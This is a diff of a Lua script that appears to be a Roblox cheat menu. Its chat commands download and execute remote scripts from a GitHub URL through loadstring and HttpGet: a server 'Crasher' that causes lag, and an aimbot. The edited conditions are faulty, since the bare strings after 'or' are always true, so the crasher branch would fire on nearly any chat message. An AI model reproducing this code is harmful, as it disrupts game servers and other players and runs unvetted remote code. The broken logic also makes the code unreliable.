@@ -38,7 +38,7 @@ local function createHelpGui()
     local list = Instance.new("TextLabel")
     list.Size = UDim2.new(1, -20, 1, -50)
     list.Position = UDim2.new(0, 15, 0, 50)
-    list.Text = "• !재접 / !rj : 서버 재접속\n• !렉 / !lag : 서버 렉 실행\n• !도움 / !help : 도움말 토글\n• !에임봇 / !aimbot : 에임봇 스크립트 실행"
+    list.Text = "• !재접 / !rj : 서버 재접속\n• !/?렉 / !/?lag : 서버 렉 실행\n• !/?도움 / !/?help : 도움말 토글\n• !/?에임봇 / !/?aimbot : 에임봇 스크립트 실행"
     list.TextColor3 = Color3.fromRGB(220, 220, 220)
     list.BackgroundTransparency = 1
     list.Font = Enum.Font.Gotham
@@ -87,12 +87,12 @@ lp.Chatted:Connect(function(msg)
             end
         end)
 
-    elseif lowerMsg == "!렉" or lowerMsg == "!lag" then
+    elseif lowerMsg == "!렉" or "!lag" or "렉?" or "lag?" then
         pcall(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/dosi1100-cmyk/script/refs/heads/main/Crasher"))()
         end)
 
-    elseif lowerMsg == "!에임봇" or lowerMsg == "!aimbot" then
+    elseif lowerMsg == "!에임봇" or "!aimbot" or "에임봇?" or "aimbot?" then
         pcall(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/dosi1100-cmyk/script/refs/heads/main/aimbot"))()
         end)
